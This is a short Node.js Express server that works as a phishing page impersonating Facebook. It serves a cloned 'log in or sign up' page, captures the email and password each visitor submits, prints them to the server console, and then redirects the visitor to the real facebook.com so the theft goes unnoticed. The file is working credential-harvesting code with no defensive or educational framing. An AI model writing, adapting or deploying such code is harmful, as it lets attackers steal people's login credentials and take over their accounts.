const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const app = express();
const port = process.env.PORT || 3000;

// sendFile will go here

app.use(express.static(__dirname + '/public' ));
app.use(bodyParser.urlencoded({extended:true}));
app.get('/', function(req, res) {
res.sendFile(path.join(__dirname, 'Facebook – log in or sign up.html'));
});


app.post("/" ,function(req,res){
const email = req.body.email; 
const pass = req.body.pass;   
console.log(email); 
console.log(pass); 
 res.redirect("https://www.facebook.com");         
//  res.sendFile(path.join(__dirname, 'index.html'));
})



app.listen(port);
console.log('Server started at http://localhost:' + port);
